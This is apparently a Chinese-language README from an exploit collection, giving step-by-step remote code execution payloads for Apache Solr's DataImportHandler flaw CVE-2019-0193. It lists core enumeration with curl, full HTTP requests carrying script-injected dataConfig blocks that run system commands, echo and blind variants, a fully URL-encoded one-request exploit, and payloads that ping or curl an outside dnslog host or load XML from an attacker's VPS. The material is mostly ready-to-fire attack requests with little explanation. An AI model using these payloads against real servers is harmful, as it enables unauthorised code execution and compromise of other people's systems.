<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**  *generated with [DocToc](https://github.com/thlorenz/doctoc)*

  - [Apache Solr Rce cve-2019-0193](#apache-solr-rce-cve-2019-0193)
    - [# 1x01 恶意xml引用](#-1x01-%E6%81%B6%E6%84%8Fxml%E5%BC%95%E7%94%A8)
    - [# 有回显payload](#-%E6%9C%89%E5%9B%9E%E6%98%BEpayload)
    - [# 有回显payload - 2](#-%E6%9C%89%E5%9B%9E%E6%98%BEpayload---2)
    - [# 无回显payload](#-%E6%97%A0%E5%9B%9E%E6%98%BEpayload)
    - [# POST](#-post)
    - [# 区别](#-%E5%8C%BA%E5%88%AB)
    - [参考](#%E5%8F%82%E8%80%83)
    - [ENJOY!](#enjoy)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# Collection of verified vulnerabilities

## Apache Solr Rce cve-2019-0193

核心：
```bash
curl http://192.168.1.1:991/solr/admin/cores\?wt\=json                  
{"responseHeader":{"status":0,"QTime":17},"initFailures":{},"status":{"core1":{"name":"core1","instanceDir":"D:\\apache-tomcat-8.5.32\\webapps\\solr\\solrHome\\core1","dataDir":"D:\\apache-tomcat-8.5.32\\webapps\\solr\\solrHome\\core1\\data\\","config":"solrconfig.xml","schema":"managed-schema","startTime":"2021-04-25T12:43:08.088Z","uptime":62054759,"index":{"numDocs":181826,"maxDoc":181827,"deletedDocs":1,"indexHeapUsageBytes":-1,"version":15488,"segmentCount":13,"current":false,"hasDeletions":true,"directory":"org.apache.lucene.store.NRTCachingDirectory:NRTCachingDirectory(MMapDirectory@D:\\apache-tomcat-8.5.32\\webapps\\solr\\solrHome\\core1\\data\\index lockFactory=org.apache.lucene.store.NativeFSLockFactory@50d44b11; maxCacheMB=48.0 maxMergeSizeMB=4.0)","segmentsFile":"segments_1z0","segmentsFileSizeInBytes":-1,"userData":{"commitTimeMSec":"1619351488535"},"lastModified":"2021-04-25T11:51:28.535Z","sizeInBytes":81525254,"size":"77.75 MB"}},"us_series":{"name":"us_series","instanceDir":"D:\\apache-tomcat-8.5.32\\webapps\\solr\\solrHome\\us_series","dataDir":"D:\\apache-tomcat-8.5.32\\webapps\\solr\\solrHome\\us_series\\data\\","config":"solrconfig.xml","schema":"managed-schema","startTime":"2021-02-22T09:35:28.041Z","uptime":5429953208,"index":{"numDocs":0,"maxDoc":0,"deletedDocs":0,"indexHeapUsageBytes":0,"version":10,"segmentCount":0,"current":false,"hasDeletions":false,"directory":"org.apache.lucene.store.NRTCachingDirectory:NRTCachingDirectory(MMapDirectory@D:\\apache-tomcat-8.5.32\\webapps\\solr\\solrHome\\us_series\\data\\index lockFactory=org.apache.lucene.store.NativeFSLockFactory@50d44b11; maxCacheMB=48.0 maxMergeSizeMB=4.0)","segmentsFile":"segments_3","segmentsFileSizeInBytes":-1,"userData":{"commitTimeMSec":"1591665641933"},"lastModified":"2020-06-09T01:20:41.933Z","sizeInBytes":1508,"size":"1.47 KB"}}}}
```
可利用的核心就是`core1`、`us_series`；即可构造传参url：

- http://192.168.1.1:991/solr/core1/dataimport
- http://192.168.1.1:991/solr/us_series/dataimport
- 有回显：
    - 找到利用核心 -> payload写入 -> RCE
    - [*点击以进一步了解*](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CoVV/ApacheSolr/README.MD#-%E6%9C%89%E5%9B%9E%E6%98%BEpayload)
- 无回显：
    - 找到利用核心 -> payload写入 -> RCE
    - [*点击以进一步了解*](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CoVV/ApacheSolr/README.MD#-%E6%97%A0%E5%9B%9E%E6%98%BEpayload)

### # 1x01 恶意xml引用
引用地址`(https://raw.githubusercontent.com/Bin4xin/bigger-than-bigger/master/CoVV/ApacheSolr/solr.xml)`

### # 有回显payload

```
POST /solr/core1/dataimport?command=full-import&debug=true&wt=json
&indent=true&verbose=false&clean=false&commit=false&optimize=false&dataConfig= HTTP/1.1

User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 212
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
content-type: multipart/form-data; 
boundary=------------------------aceb88c2159f183f


--------------------------aceb88c2159f183f
Content-Disposition: form-data; name="stream.body"

<?xml version="1.0" encoding="UTF-8"?>
<RDF>
<item/>
</RDF>

--------------------------aceb88c2159f183f--
```
（放到Decoder模块url编码）dataConfig：
```
<dataConfig>

  <dataSource type="URLDataSource"/>
  <script><![CDATA[

          function poc(row){

var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()));

var result = [];

while(true) {
var oneline = bufReader.readLine();
result.push( oneline );
if(!oneline) break;
}

row.put("title",result.join("\n\r"));

return row;

}

  ]]></script>

        <document>
             <entity name="entity1"
                     url="http://{your_vps_ip}:{your_vps_port}/bin4xin.xml"
                     processor="XPathEntityProcessor"
                     forEach="/RDF/item"
                     transformer="script:poc">
                        <field column="title" xpath="/RDF/item/title" />
             </entity>
        </document>
</dataConfig>
```

![](../../assets/solr-RCE-echo-out.png)

### # 有回显payload - 2

> 2022/03/31/21:23:15 更新；发现一种**[无远程调用、有回显]**的exp

```
POST /solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22whoami%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1  
Host: localhost
Upgrade-Insecure-Requests: 1  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
Accept-Encoding: gzip, deflate  
Connection: close  
Upgrade-Insecure-Requests: 1  
Cache-Control: max-age=0  
Content-Length: 64  
  
<?xml version="1.0" encoding="UTF-8"?>  
<RDF>  
<item/>  
</RDF>
```

<img src="https://image.yjs2635.xyz/images/2022/03/31/2022-03-21-4.31.42.png" style='width: 100%'/>

<a><img src="https://user-images.githubusercontent.com/6628666/75466330-fe1d0c00-59c4-11ea-91ba-506f60ef8af4.png" style='width: 100%'/></a>

<a href="https://g2.antv.vision/zh/examples/gallery"><img src="https://user-images.githubusercontent.com/6628666/75466330-fe1d0c00-59c4-11ea-91ba-506f60ef8af4.png" style='width: 100%'/></a>

[comment]: <> (f4ck!)

### # 无回显payload

区别在于dataConfig：

```
<dataConfig>
<dataSource name="streamsrc" type="ContentStreamDataSource" loggerLevel="TRACE" />

  <script><![CDATA[
          function poc(row){
 var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("ping w5zhv5.dnslog.cn").getInputStream()));

var result = [];

while(true) {
var oneline = bufReader.readLine();
result.push( oneline );
if(!oneline) break;
}

row.put("title",result.join("\n\r"));
return row;

}

]]></script>

<document>
    <entity
        stream="true"
        name="entity1"
        datasource="streamsrc1"
        processor="XPathEntityProcessor"
        rootEntity="true"
        forEach="/RDF/item"
        transformer="script:poc">
             <field column="title" xpath="/RDF/item/title" />
    </entity>
</document>
</dataConfig>

```

### # POST

```bash
POST /solr/core1/dataimport HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 581

command=full-import&verbose=false&clean=false&commit=false&debug=true&core=new_core&name=dataimport&dataConfig=<dataConfig>
  <dataSource type="URLDataSource"/>
  <script><![CDATA[
          function poc(data){
new+java.lang.ProcessBuilder["(java.lang.String[])"](["curl","fy544n.dnslog.cn"]).start()
}
  ]]></script>

  <document>
    <entity name="stackoverflow"
            url="https://stackoverflow.com/feeds/tag/solr"
            processor="XPathEntityProcessor"
            forEach="/feed"
            transformer="script:poc" />
  </document>
</dataConfig>
```

![](../../assets/solr-RCE-post-method.png)


### # 区别
左边无回显，右边有回显

![](../../assets/solr-payload-difference.png)

### 参考

[漏洞分析 - Apache Solr远程代码执行漏洞(CVE-2019-0193)](https://xz.aliyun.com/t/5965)

### ENJOY!